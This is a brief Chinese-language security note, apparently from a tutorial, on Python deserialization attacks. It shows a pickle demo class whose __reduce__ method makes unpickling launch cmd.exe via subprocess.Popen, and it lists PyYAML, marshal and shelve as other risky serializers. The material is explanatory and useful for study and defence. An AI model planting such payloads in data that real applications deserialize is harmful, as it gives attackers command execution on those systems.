反序列化
========================================

pickle demo
----------------------------------------
Python Pickle在反序列化时会调用 ``__reduce__`` ，可用自定义的 ``__reduce__`` 函数来实现攻击。

.. code-block:: python

    import pickle
    import pickletools
    import subprocess

    class A(object):
        a = 1
        b = 2
        def __reduce__(self):
            return (subprocess.Popen, (('cmd.exe',),))

    data = pickle.dumps(A())
    pickletools.dis(data)


其他序列化库
----------------------------------------
- PyYAML
- marshal
- shelve
